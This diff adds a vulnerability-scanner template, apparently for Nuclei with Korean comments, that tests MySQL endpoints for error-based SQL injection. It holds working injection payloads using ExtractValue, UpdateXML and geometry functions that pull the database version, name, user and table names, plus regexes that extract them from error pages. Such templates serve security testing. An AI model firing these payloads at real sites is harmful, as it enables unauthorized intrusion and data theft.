@@ -1,0 +1,48 @@
+id: sqli-xml-xpath-mysql
+
+info:
+  name: SQL Injection via MySQL XML/XPath Functions (ExtractValue/UpdateXML)
+  author: security-researcher
+  severity: high
+  description: |
+    MySQL의 ExtractValue() 및 UpdateXML() XML 함수를 이용한
+    에러 기반 SQL 인젝션으로 데이터베이스 정보를 추출합니다.
+  tags: sqli,xml,xpath,mysql,error-based,injection
+
+http:
+  - method: GET
+    path:
+      # ExtractValue를 이용한 에러 기반 정보 추출
+      - "{{BaseURL}}?id=1 AND ExtractValue(1,concat(0x7e,(SELECT version())))--"
+      - "{{BaseURL}}?id=1 AND ExtractValue(1,concat(0x7e,(SELECT database())))--"
+      - "{{BaseURL}}?id=1 AND ExtractValue(1,concat(0x7e,(SELECT user())))--"
+      - "{{BaseURL}}?id=1 AND ExtractValue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--"
+      # UpdateXML을 이용한 에러 기반 정보 추출
+      - "{{BaseURL}}?id=1 AND UpdateXML(1,concat(0x7e,(SELECT version())),1)--"
+      - "{{BaseURL}}?id=1 AND UpdateXML(1,concat(0x7e,(SELECT database())),1)--"
+      - "{{BaseURL}}?id=1 AND UpdateXML(1,concat(0x7e,(SELECT user())),1)--"
+      # Geometrical Error 기반
+      - "{{BaseURL}}?id=1 AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--"
+      - "{{BaseURL}}?id=1 AND ST_LatFromGeoHash((SELECT * FROM (SELECT version())a))--"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "XPATH syntax error"
+          - "~.*\\..*\\..*"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: db-version
+        regex:
+          - "~([0-9\\.\\-a-zA-Z]+)"
+      - type: regex
+        part: body
+        name: db-name
+        regex:
+          - "XPATH syntax error:.*'~(.+?)'"
